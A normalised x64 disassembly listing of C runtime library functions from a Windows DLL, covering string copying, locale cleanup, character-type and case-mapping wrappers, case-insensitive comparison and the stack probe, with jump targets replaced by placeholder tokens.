mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_180003afc
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_1800054cc
mov eax ebx
sub_1800070f8
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_180003afc
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_180003afc
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_1800054cc
mov eax ebx
sub_1800071e4
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180003afc
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_180003afc
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_1800054cc
mov eax ebx
sub_180007250
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_180003afc
mov [ rax ] 0x16
call sub_1800054cc
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_180007290
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_1800035c8
mov rcx [ rbx + 0x10 ]
call sub_1800035c8
mov rcx [ rbx + 0x18 ]
call sub_1800035c8
mov rcx [ rbx + 0x20 ]
call sub_1800035c8
mov rcx [ rbx + 0x28 ]
call sub_1800035c8
mov rcx [ rbx + 0x30 ]
call sub_1800035c8
mov rcx [ rbx ]
call sub_1800035c8
mov rcx [ rbx + 0x40 ]
call sub_1800035c8
mov rcx [ rbx + 0x48 ]
call sub_1800035c8
mov rcx [ rbx + 0x50 ]
call sub_1800035c8
mov rcx [ rbx + 0x58 ]
call sub_1800035c8
mov rcx [ rbx + 0x60 ]
call sub_1800035c8
mov rcx [ rbx + 0x68 ]
call sub_1800035c8
mov rcx [ rbx + 0x38 ]
call sub_1800035c8
mov rcx [ rbx + 0x70 ]
call sub_1800035c8
mov rcx [ rbx + 0x78 ]
call sub_1800035c8
mov rcx [ rbx + 0x80 ]
call sub_1800035c8
mov rcx [ rbx + 0x88 ]
call sub_1800035c8
mov rcx [ rbx + 0x90 ]
call sub_1800035c8
mov rcx [ rbx + 0x98 ]
call sub_1800035c8
mov rcx [ rbx + 0xa0 ]
call sub_1800035c8
mov rcx [ rbx + 0xa8 ]
call sub_1800035c8
mov rcx [ rbx + 0xb0 ]
call sub_1800035c8
mov rcx [ rbx + 0xb8 ]
call sub_1800035c8
mov rcx [ rbx + 0xc0 ]
call sub_1800035c8
mov rcx [ rbx + 0xc8 ]
call sub_1800035c8
mov rcx [ rbx + 0xd0 ]
call sub_1800035c8
mov rcx [ rbx + 0xd8 ]
call sub_1800035c8
mov rcx [ rbx + 0xe0 ]
call sub_1800035c8
mov rcx [ rbx + 0xe8 ]
call sub_1800035c8
mov rcx [ rbx + 0xf0 ]
call sub_1800035c8
mov rcx [ rbx + 0xf8 ]
call sub_1800035c8
mov rcx [ rbx + 0x100 ]
call sub_1800035c8
mov rcx [ rbx + 0x108 ]
call sub_1800035c8
mov rcx [ rbx + 0x110 ]
call sub_1800035c8
mov rcx [ rbx + 0x118 ]
call sub_1800035c8
mov rcx [ rbx + 0x120 ]
call sub_1800035c8
mov rcx [ rbx + 0x128 ]
call sub_1800035c8
mov rcx [ rbx + 0x130 ]
call sub_1800035c8
mov rcx [ rbx + 0x138 ]
call sub_1800035c8
mov rcx [ rbx + 0x140 ]
call sub_1800035c8
mov rcx [ rbx + 0x148 ]
call sub_1800035c8
mov rcx [ rbx + 0x150 ]
call sub_1800035c8
mov rcx [ rbx + 0x170 ]
call sub_1800035c8
mov rcx [ rbx + 0x178 ]
call sub_1800035c8
mov rcx [ rbx + 0x180 ]
call sub_1800035c8
mov rcx [ rbx + 0x188 ]
call sub_1800035c8
mov rcx [ rbx + 0x190 ]
call sub_1800035c8
mov rcx [ rbx + 0x198 ]
call sub_1800035c8
mov rcx [ rbx + 0x168 ]
call sub_1800035c8
mov rcx [ rbx + 0x1a8 ]
call sub_1800035c8
mov rcx [ rbx + 0x1b0 ]
call sub_1800035c8
mov rcx [ rbx + 0x1b8 ]
call sub_1800035c8
mov rcx [ rbx + 0x1c0 ]
call sub_1800035c8
mov rcx [ rbx + 0x1c8 ]
call sub_1800035c8
mov rcx [ rbx + 0x1d0 ]
call sub_1800035c8
mov rcx [ rbx + 0x1a0 ]
call sub_1800035c8
mov rcx [ rbx + 0x1d8 ]
call sub_1800035c8
mov rcx [ rbx + 0x1e0 ]
call sub_1800035c8
mov rcx [ rbx + 0x1e8 ]
call sub_1800035c8
mov rcx [ rbx + 0x1f0 ]
call sub_1800035c8
mov rcx [ rbx + 0x1f8 ]
call sub_1800035c8
mov rcx [ rbx + 0x200 ]
call sub_1800035c8
mov rcx [ rbx + 0x208 ]
call sub_1800035c8
mov rcx [ rbx + 0x210 ]
call sub_1800035c8
mov rcx [ rbx + 0x218 ]
call sub_1800035c8
mov rcx [ rbx + 0x220 ]
call sub_1800035c8
mov rcx [ rbx + 0x228 ]
call sub_1800035c8
mov rcx [ rbx + 0x230 ]
call sub_1800035c8
mov rcx [ rbx + 0x238 ]
call sub_1800035c8
mov rcx [ rbx + 0x240 ]
call sub_1800035c8
mov rcx [ rbx + 0x248 ]
call sub_1800035c8
mov rcx [ rbx + 0x250 ]
call sub_1800035c8
mov rcx [ rbx + 0x258 ]
call sub_1800035c8
mov rcx [ rbx + 0x260 ]
call sub_1800035c8
mov rcx [ rbx + 0x268 ]
call sub_1800035c8
mov rcx [ rbx + 0x270 ]
call sub_1800035c8
mov rcx [ rbx + 0x278 ]
call sub_1800035c8
mov rcx [ rbx + 0x280 ]
call sub_1800035c8
mov rcx [ rbx + 0x288 ]
call sub_1800035c8
mov rcx [ rbx + 0x290 ]
call sub_1800035c8
mov rcx [ rbx + 0x298 ]
call sub_1800035c8
mov rcx [ rbx + 0x2a0 ]
call sub_1800035c8
mov rcx [ rbx + 0x2a8 ]
call sub_1800035c8
mov rcx [ rbx + 0x2b0 ]
call sub_1800035c8
mov rcx [ rbx + 0x2b8 ]
call sub_1800035c8
add rsp 0x20
pop rbx
sub_180007680
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
add rsp 0x20
pop rbx
call sub_1800035c8
sub_1800076ec
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800035c8
add rsp 0x20
pop rbx
call sub_1800035c8
sub_1800077f8
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_180003090
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_180003c18
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_1800035c8
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180007de0
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_180003c18
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_1800035c8
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180007de0
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180007ac4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_180006208
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_1800077f8
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180007b5c
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_180003090
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_1800030c0
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_180003c18
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_1800035c8
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180007de0
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180007cbc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_180006208
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_180007b5c
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180007d3c
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_180003afc
mov [ rax ] 0x16
call sub_1800054cc
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_180007d78
sub rsp 0x28
call sub_1800068bc
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_1800068cc
mov ecx 0x3
call sub_18000474c
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_1800052dc
sub_180007de0
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_180007e40
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_180007e7c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_180006208
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180003afc
mov [ rax ] 0x16
call sub_1800054cc
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub rsi rdi
mov rdx rdi
mov rcx rsi
call sub_180007e40
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rsi + rdi ]
lea rdx [ rbp - 0x20 ]
call sub_180008248
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_180008248
inc rdi
test ebx ebx
je r-xdata
sub_180007f54
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
add rsp 0x28
jmp sub_180007e7c
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180003afc
mov [ rax ] 0x16
call sub_1800054cc
mov eax 0x7fffffff
add rsp 0x28
retn
add rsp 0x28
jmp sub_180007e40
sub_180007f9c
push rbp
push r12
push r13
sub rsp 0x60
lea rbp [ rsp + 0x50 ]
mov [ rbp + 0x30 ] rbx
mov [ rbp + 0x38 ] rsi
mov [ rbp + 0x40 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov r12 r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_180008398
cmp rax rsi
jb r-xdata
call sub_180003afc
mov ebx 0x16
mov rax [ r12 ]
mov edx [ rax + 0x14 ]
test edx edx
je r-xdata
mov [ rbx ] 0x0
jmp r-xdata
mov eax ebx
cmp [ rbx ] 0x0
jne r-xdata
mov eax [ rax + 0x4 ]
mov [ rsp + 0x40 ] 0x1
mov r9 rbx
mov [ rsp + 0x38 ] eax
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
or [ rsp + 0x20 ] 0xffffffff
mov r8d 0x100
mov rcx r12
call sub_180007ac4
movsxd r13 eax
test eax eax
jne r-xdata
mov al [ rbx ]
cmp al 0x41
jl r-xdata
xor eax eax
jmp r-xdata
mov rcx r13
cmp rsi r13
jae r-xdata
call sub_180003afc
mov ebx 0x2a
mov [ rax ] ebx
inc rbx
cmp al 0x5a
jg r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_180003090
mov rbx [ rbp + 0x30 ]
mov rsi [ rbp + 0x38 ]
mov rdi [ rbp + 0x40 ]
lea rsp [ rbp + 0x10 ]
pop r13
pop r12
pop rbp
retn
test eax eax
jle r-xdata
mov [ rbx ] 0x0
call sub_180003afc
mov ebx 0x22
jmp r-xdata
add al 0x20
mov [ rbx ] al
xor edi edi
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax 0x1
jb r-xdata
mov [ rax ] ebx
call sub_1800054cc
jmp r-xdata
mov rcx [ r12 ]
mov [ rsp + 0x40 ] 0x1
mov r9 rbx
mov eax [ rcx + 0x4 ]
mov edx [ rcx + 0x14 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] r13d
mov rcx r12
mov [ rsp + 0x28 ] rdi
or [ rsp + 0x20 ] 0xffffffff
call sub_180007ac4
test eax eax
je r-xdata
call sub_180003afc
mov [ rax ] 0xc
jmp r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
call sub_180003afc
mov ebx 0x2a
mov [ rax ] ebx
mov r8 rdi
mov rdx rsi
mov rcx rbx
call sub_180006cb0
mov ebx eax
jmp r-xdata
call sub_180003afc
mov eax [ rax ]
jmp r-xdata
call sub_180003c18
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_1800035c8
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
test rdi rdi
jne r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180007de0
sub rsp rax
lea rdi [ rsp + 0x50 ]
test rdi rdi
je r-xdata
mov rax 0xffffffffffffff0
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_180008198
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x20 ]
mov rdx r8
call sub_180006208
lea r8 [ rsp + 0x20 ]
mov rdx rbx
mov rcx rdi
call sub_180007f9c
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800081e4
push rbx
sub rsp 0x20
xor edx edx
mov rbx rcx
cmp [ rw-data ] edx
jne r-xdata
xor r8d r8d
or rdx 0xffffffffffffffff
call sub_180008198
test rcx rcx
jne r-xdata
mov rax rcx
cmp [ rcx ] dl
je r-xdata
call sub_180003afc
mov [ rax ] 0x16
call sub_1800054cc
xor eax eax
jmp r-xdata
mov rax rbx
mov cl [ rax ]
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
inc rax
cmp [ rax ] dl
jne r-xdata
cmp cl 0x5a
jg r-xdata
jmp r-xdata
add cl 0x20
mov [ rax ] cl
sub_180008248
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rbp - 0x20 ]
call sub_180006208
cmp edi 0x100
jae r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rbp - 0x20 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_180003afc
mov edx 0x1
mov [ rax ] 0x2a
mov [ rbp + 0x10 ] dil
mov [ rbp + 0x11 ] 0x0
mov r12d edi
lea rdx [ rbp - 0x20 ]
sar r12d 0x8
movzx ecx r12b
call sub_1800083b4
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rbp - 0x20 ]
mov edx 0x1
mov ecx edi
call sub_1800083fc
mov rdx [ rbp - 0x20 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rbp + 0x20 ]
je r-xdata
mov [ rbp + 0x10 ] r12b
mov [ rbp + 0x11 ] dil
mov [ rbp + 0x12 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx ecx [ rbp + 0x21 ]
shl eax 0x8
or eax ecx
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rbp + 0x10 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rbp - 0x20 ]
call sub_180007ac4
test eax eax
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rdi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800083b4
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_180006208
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800083fc
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_180006208
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_1800083b4
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
